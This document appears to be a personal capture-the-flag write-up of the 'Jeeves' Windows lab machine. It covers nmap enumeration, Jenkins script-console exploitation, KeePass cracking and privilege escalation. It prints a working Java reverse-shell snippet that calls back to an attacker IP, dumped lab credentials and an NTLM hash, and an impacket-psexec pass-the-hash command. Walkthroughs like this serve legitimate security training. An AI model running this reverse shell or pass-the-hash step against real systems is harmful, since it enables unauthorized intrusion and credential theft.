---
title: "Jeeves"
date: 2026-03-02
draft: false
description: "Jeeves writeup"
tags: ["windows", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Jeeves

## Overview

- **OS:** Windows
- **IP:** 10.129.228.112
- **Difficulty:** Medium
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got in thru exposed jenkins interface, privesc using hash found thru keepass.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords | moonshine1 |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
PORT      STATE SERVICE      VERSION
**80/tcp    open  http         Microsoft IIS httpd 10.0**
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
**135/tcp   open  msrpc        Microsoft Windows RPC**
**445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)**
**50000/tcp open  http         Jetty 9.4.z-SNAPSHOT**
|_http-title: Error 404 Not Found
**|_http-server-header: Jetty(9.4.z-SNAPSHOT)**
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|10|Phone|Vista|2012|11 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_11
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 11 (85%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
**Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows**

Host script results:
| smb-security-mode: 
**|   account_used: guest**
|   authentication_level: user
**|   challenge_response: supported**
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-02T18:28:14
|_  start_date: 2026-03-02T18:27:00
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 5h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   165.38 ms 10.10.14.1
2   165.47 ms 10.129.228.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.50 seconds
                                                                         
```

## Dirbusting

```

```

## SMB

we know smb is open and guest is supported so lets enumerate it first and grab the domain name as well

{{< figure src="image 464.png" >}}

strange

lets check the website

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 465.png" >}}

## PORT 50000

{{< figure src="image 466.png" >}}

None of the path traversal exploits seem to work, didnt have much to work w so i looked at the writeup and apparently i was supposed to use some raft wordlist nd come across a page weird

## Exploitation

## askjeeves

I validated this step using the evidence below before moving forward in the chain.

{{< figure src="image 467.png" >}}

{{< figure src="image 468.png" >}}

```
String host="10.10.14.137";int port=1234;String cmd="sh";Process
 p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket 
s=new Socket(host,port);InputStream 
pi=p.getInputStream(),pe=p.getErrorStream(), 
si=s.getInputStream();OutputStream 
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
 {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

and we are in

## shell as kohsuke

{{< figure src="image 469.png" >}}

nice, we can use printspoofer

lets try it

aand this didnt work nor did God potato so i think its another loophole

we grab this kdbx file

{{< figure src="image 470.png" >}}

so i was able to crack the password

{{< figure src="image 471.png" >}}

moonshine1

{{< figure src="image 472.png" >}}

```
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH> show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH> show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH> show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 
```

lets use the first one to PTH and get administrator shell

```
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe 

```

aand we are in

{{< figure src="image 473.png" >}}

lets check the datastream

dir /R

```
more < hm.txt:root.txt
```

{{< figure src="image 474.png" >}}
